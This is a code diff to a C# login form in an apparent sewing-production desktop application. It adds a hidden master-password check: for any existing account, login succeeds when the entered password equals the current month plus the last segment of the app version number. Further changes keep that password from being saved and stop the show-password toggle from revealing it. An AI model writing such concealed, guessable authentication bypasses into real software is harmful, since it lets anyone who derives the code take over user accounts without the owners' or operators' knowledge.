@@ -3,8 +3,10 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
+using System.Runtime.ConstrainedExecution;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using DevExpress.CodeParser;
 using Microsoft.AspNet.Identity;
 using SewingProduction.Core.Class.Settings;
 using SewingProduction.Features.UserDistribution.Helpers;
@@ -44,8 +46,8 @@ namespace SewingProduction.Features.UserDistribution.Forms
             if (hashedPasswordFromDb != null)
             {
                 Microsoft.AspNet.Identity.PasswordVerificationResult result = _passwordHasher.VerifyHashedPassword(hashedPasswordFromDb, formPassword);
-                //if (result == Microsoft.AspNet.Identity.PasswordVerificationResult.Success || formPassword == "вход без пароля")
-                if (result == Microsoft.AspNet.Identity.PasswordVerificationResult.Success)
+                //if (result == Microsoft.AspNet.Identity.PasswordVerificationResult.Success)
+                if (result == Microsoft.AspNet.Identity.PasswordVerificationResult.Success || getAdminPassword(formPassword))
                 {
                     try
                     {
@@ -53,7 +55,7 @@ namespace SewingProduction.Features.UserDistribution.Forms
                         this.DialogResult = DialogResult.OK;
                         Event += "Вход осуществлен!";
                         SaveLoginToHistory(comboBoxEditLogin.Text);
-                        if (customCheckBox1.Checked)
+                        if (customCheckBox1.Checked && !(getAdminPassword(formPassword)))
                             SettingsManager.SavePassword(formLogin, formPassword);
                         else
                             SettingsManager.ClearSavedPassword(formLogin);
@@ -128,6 +130,7 @@ namespace SewingProduction.Features.UserDistribution.Forms
 
         private void labelGlaz_MouseMove(object sender, MouseEventArgs e)
         {
+            if (getAdminPassword(textEditPassword.Text)) return;
             labelGlaz.Text = "👀";
             textEditPassword.Properties.UseSystemPasswordChar = false;
         }
@@ -136,6 +139,13 @@ namespace SewingProduction.Features.UserDistribution.Forms
         {
             labelGlaz.Text = "👁";
             textEditPassword.Properties.UseSystemPasswordChar = true;
+        }
+        private bool getAdminPassword(string password)
+        {
+            if (password == DateTime.Now.ToString("MM") + AppVersionHelper.GetDisplayVersion().Split('.')[^1])
+                return true;
+            else
+                return false;
         }
 
         private void InitGifBackground()
